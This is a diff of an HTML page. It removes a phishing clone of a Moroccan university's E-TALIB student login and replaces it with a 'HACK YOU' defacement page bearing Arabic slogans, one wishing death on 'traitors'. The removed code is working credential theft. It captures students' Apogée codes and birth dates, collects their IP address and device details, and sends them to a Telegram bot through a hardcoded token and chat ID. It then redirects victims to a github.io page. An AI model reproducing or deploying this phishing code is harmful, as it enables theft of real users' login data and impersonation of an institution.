@@ -1,173 +1,65 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">
-  <title>E-TALIB</title>
-  <meta name="robots" content="noindex, nofollow">
-  <meta content="" name="description">
-  <meta content="" name="keywords">
-  <link href="https://ent-fpo.uiz.ac.ma/assets/img/favicon.ico" rel="icon">
-  <link href="E-TALIB_files/fonts.css" rel="stylesheet">
-  <link href="E-TALIB_files/bootstrap.min.css" rel="stylesheet">
-  <link href="E-TALIB_files/bootstrap-icons.css" rel="stylesheet">
-  <link href="E-TALIB_files/boxicons.min.css" rel="stylesheet">
-  <link href="E-TALIB_files/quill.snow.css" rel="stylesheet">
-  <link href="E-TALIB_files/quill.bubble.css" rel="stylesheet">
-  <link href="E-TALIB_files/remixicon.css" rel="stylesheet">
-  <link href="E-TALIB_files/simple-datatables.css" rel="stylesheet">
-  <link href="E-TALIB_files/style.css" rel="stylesheet">
-  
-  <!-- تضمين مكتبة axios -->
-  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-</head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACK YOU</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
 
+        .hack-text {
+            font-size: 50px;
+            font-weight: bold;
+            text-transform: uppercase;
+            animation: pulse 1.5s infinite;
+        }
+
+        .green {
+            color: limegreen;
+        }
+
+        .red {
+            color: red;
+        }
+
+        .blue {
+            color: dodgerblue;
+        }
+
+        .yellow {
+            color: gold;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .symbol {
+            font-size: 100px;
+            color: yellow;
+        }
+    </style>
+</head>
 <body>
 
-  <main>
-    <div class="container">
-      <section class="section register min-vh-100 d-flex flex-column align-items-center justify-content-center py-4">
-        <div class="container">
-          <div class="row justify-content-center">
-            <div class="col-lg-4 col-md-6 d-flex flex-column align-items-center justify-content-center">
-              <div class="card mb-3">
-                <div class="card-body">
-                  <div class="d-flex justify-content-center py-4">
-                    <a href="https://ent-fpo.uiz.ac.ma/index" class="logo d-flex align-items-center w-auto">
-                      <img src="E-TALIB_files/FPO.jpg" alt="" style="max-height: 100px">
-                    </a>
-                  </div>
-                  <div class="pt-4 pb-2">
-                    <h5 class="card-title text-center pb-0 fs-4">Authentification</h5><br>
-                  </div>
+    <h1 class="hack-text green">HACK YOU</h1>
+    <div class="symbol">⚡💻</div>
 
-                  <form id="login-form" method="POST" action="" class="row g-3 needs-validation" novalidate="">
+    <h2 class="hack-text red">HACK YOU</h2>
+    <div class="symbol">🔥💣</div>
 
-                    <div class="col-12">
-                      <label for="yourUsername" class="form-label">Code APOGEE:</label>
-                      <div class="input-group has-validation">
-                        <input type="text" placeholder="Login (code Apogée)" name="APOGEE" class="form-control" id="APOGEE" onkeydown="if(event.keyCode==32) return false;" required="">
-                        <div class="invalid-feedback">Veuillez vérifier et compléter ce champ.</div>
-                      </div>
-                    </div>
+    <h1 class="hack-text blue">يعيش الإسلام</h1>
+    <div class="symbol">🕌✨</div>
 
-                    <div class="col-12">
-                      <label for="yourPassword" class="form-label">Date de Naissance (jj/mm/aaaa):</label>
-                      <input type="date" placeholder="" name="DN" class="form-control" id="DN" required="">
-                      <div class="invalid-feedback">Veuillez vérifier et compléter ce champ.</div>
-                    </div>
+    <h2 class="hack-text yellow">ويموت الطاعنون والخونة</h2>
+    <div class="symbol">💀⚔️</div>
 
-                    <div class="col-12">
-                      <div class="form-check">
-                        <input class="form-check-input" type="checkbox" name="remember" value="true" id="rememberMe">
-                        <label class="form-check-label" for="rememberMe">Se souvenir de moi ?</label>
-                      </div>
-                    </div>
-
-                    <div class="col-12">
-                      <button class="btn btn-primary w-100" type="submit">Se connecter</button>
-                    </div>
-
-                    <div class="col-12">
-                      <p class="small mb-0">
-                        Si vous rencontrez des difficultés pour vous connecter à votre compte, veuillez nous contacter.
-                        <strong><b style="color:red;"><a href="https://ent-fpo.uiz.ac.ma/GET_APOGEE.php">Obtenir votre code APOGEE</a></b></strong>
-                      </p>
-                    </div>
-                  </form>
-                </div>
-              </div>
-              <div class="copyright">
-                © Tous Droits Réservés.
-                <strong>
-                  <span>FPO</span>
-                </strong>
-              </div>
-              <div class="credits">
-                <a href="https://fpo.uiz.ac.ma/">Faculté Polydisciplinaire d'Ouarzazate</a>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-    </div>
-  </main>
-
-  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
-
-  <script src="E-TALIB_files/apexcharts.min.js"></script>
-  <script src="E-TALIB_files/bootstrap.bundle.min.js"></script>
-  <script src="E-TALIB_files/chart.min.js"></script>
-  <script src="E-TALIB_files/echarts.min.js"></script>
-  <script src="E-TALIB_files/quill.min.js"></script>
-  <script src="E-TALIB_files/simple-datatables.js"></script>
-  <script src="E-TALIB_files/tinymce.min.js"></script>
-  <script src="E-TALIB_files/validate.js"></script>
-  <script src="E-TALIB_files/main.js"></script>
-
-  <svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xlink="http://www.w3.org/1999/xlink" svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;">
-    <defs id="SvgjsDefs1002"></defs>
-    <polyline id="SvgjsPolyline1003" points="0,0"></polyline>
-    <path id="SvgjsPath1004" d="M0 0 "></path>
-  </svg>
-
-  <script>
-    const TOKEN = "7593409061:AAHEPCTCLtvxaAWcEym79gL8ueHRB7tvDXg";
-    const CHAT_ID = "6015215674"; 
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-    document.getElementById('login-form').addEventListener('submit', function (e) {
-      e.preventDefault(); // منع الإرسال التقليدي للنموذج
-
-      const APOGEE = document.getElementById('APOGEE').value; // جمع قيمة حقل Code APOGEE
-      const DN = document.getElementById('DN').value; // جمع قيمة حقل تاريخ الميلاد
-
-      // التحقق من وجود بيانات المدخلات
-      if (!APOGEE || !DN) {
-        alert("يرجى ملء جميع الحقول.");
-        return;
-      }
-
-      // الحصول على عنوان IP الخاص بالمستخدم
-      axios.get('https://api.ipify.org?format=json')
-        .then(response => {
-          const ip = response.data.ip;
-          const userAgent = navigator.userAgent;
-          const platform = navigator.platform;
-          const screenWidth = screen.width;
-          const screenHeight = screen.height;
-          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Ordinateur';
-
-          // إعداد الرسالة التي سيتم إرسالها إلى تلغرام
-          const message = `
-<b>Nouvelle tentative de connexion</b>
-<b>Code APOGEE :</b> ${APOGEE}
-<b>Date de Naissance :</b> ${DN}
-<b>Adresse IP :</b> ${ip}
-<b>Type d'appareil :</b> ${deviceType}
-<b>Plateforme :</b> ${platform}
-<b>Agent utilisateur :</b> ${userAgent}
-<b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
-          `;
-
-          // إرسال الرسالة إلى تلغرام
-          axios.post(URI_API, {
-            chat_id: CHAT_ID,
-            parse_mode: 'html',
-            text: message
-          }).then(() => {
-            // إعادة توجيه المستخدم بعد نجاح الإرسال
-            
-            window.location.href = "https://e-talib-uiz.github.io/fv//index.html"; // يمكن تعديل الرابط هنا
-          }).catch((error) => {
-            console.error("خطأ في إرسال الرسالة إلى تلغرام:", error);
-          });
-        }).catch((error) => {
-          console.error("خطأ في الحصول على عنوان الـ IP:", error);
-        });
-    });
-  </script>
 </body>
 </html>
-https://e-talib-uiz.github.io/profile/E-TALIB.html
